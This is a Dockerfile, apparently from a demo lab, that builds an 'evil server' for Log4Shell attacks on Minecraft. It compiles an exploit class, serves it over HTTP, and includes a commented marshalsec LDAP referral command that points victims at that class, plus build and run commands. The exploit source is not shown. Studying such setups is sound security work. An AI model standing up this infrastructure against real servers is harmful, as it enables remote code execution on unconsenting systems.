# Use Ubuntu as the base image
FROM ubuntu:20.04

# Set environment variables to avoid user input prompts during installation
ENV DEBIAN_FRONTEND=noninteractive

# Update the package lists and install necessary packages
RUN apt-get update && \
    apt-get install -y wget curl && \
    apt-get clean

# Install Java JDK 1.8 build 181 from the archive link
RUN mkdir -p /usr/lib/jvm && \
    wget -O jdk-8u181-linux-x64.tar.gz "https://archive.org/download/Java-Archive/Java%20SE%208%20%288u202%20and%20earlier%29/8u181/JDK/jdk-8u181-linux-x64.tar.gz" && \
    tar -xzf jdk-8u181-linux-x64.tar.gz -C /usr/lib/jvm && \
    rm jdk-8u181-linux-x64.tar.gz

# Set JAVA_HOME environment variable and update PATH
ENV JAVA_HOME /usr/lib/jvm/jdk1.8.0_181
ENV PATH $JAVA_HOME/bin:$PATH

# Install Python 3
RUN apt-get update && \
    apt-get install -y python3 python3-pip && \
    apt-get clean

# Verify installations
RUN java -version && \
    python3 --version

RUN mkdir -p /demo/

# Copy local 'mcserver' folder to the Docker container 
COPY marshalsec /demo/marshalsec

# Expose necessary ports 
# 1389 for LDAP server, 8000  for the HTTP server
EXPOSE 1389 8000

# Set default directory
WORKDIR /demo/


# Copy the startup script to the container
COPY start.sh .

# Make the startup script executable
RUN chmod +x start.sh

# Compile exploit
COPY MinecraftLog4J.java /demo/MinecraftLog4J.java
RUN javac MinecraftLog4J.java

# Run HTTP server on background
RUN python3 -m http.server 8000 &

# Set default command
WORKDIR /demo/

# CMD ["bash"] 
# CMD ["java", "-cp", "marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", "http://host.docker.internal:8000/#MinecraftLog4J", "1389"]

# Set the CMD to run the startup script
CMD ["./start.sh"]





# docker build -f Dockerfile_evil_server -t evil-image .
# docker run -it -p 1389:1389 -p 8000:8000 --name evil-server evil-image
